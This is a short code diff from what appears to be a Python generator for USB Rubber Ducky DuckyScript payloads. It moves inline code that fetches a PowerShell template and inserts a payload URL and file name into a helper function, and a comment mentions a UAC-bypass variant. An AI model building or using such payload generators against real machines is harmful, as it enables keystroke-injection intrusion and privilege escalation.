@@ -238,13 +238,8 @@ def generate_script(online_version, uac_bypass, **kw):
     """
 
     if online_version and not uac_bypass: # online version without UAC bypass
-
-        # Generates a Payload Ducky Script
-        power_shell_script = download_file(WINDOW_SCRIPT_URL)
-        power_shell_script = replace_value(power_shell_script, '[URL]', kw['payload_url'])
-        write_to_file(replace_value(power_shell_script, '[NAME]', kw['file_name']))
-        print('\n[+] Payload DuckyScript.txt generated!!')
-
+        gen_payload_duckyscript(kw['payload_url'], kw['file_name']) # Generatea Payload Ducky Script
+        
     elif online_version and uac_bypass: #  online version with UAC bypass
 
         # Generates a UAC-Duck-Payload.vbs payload
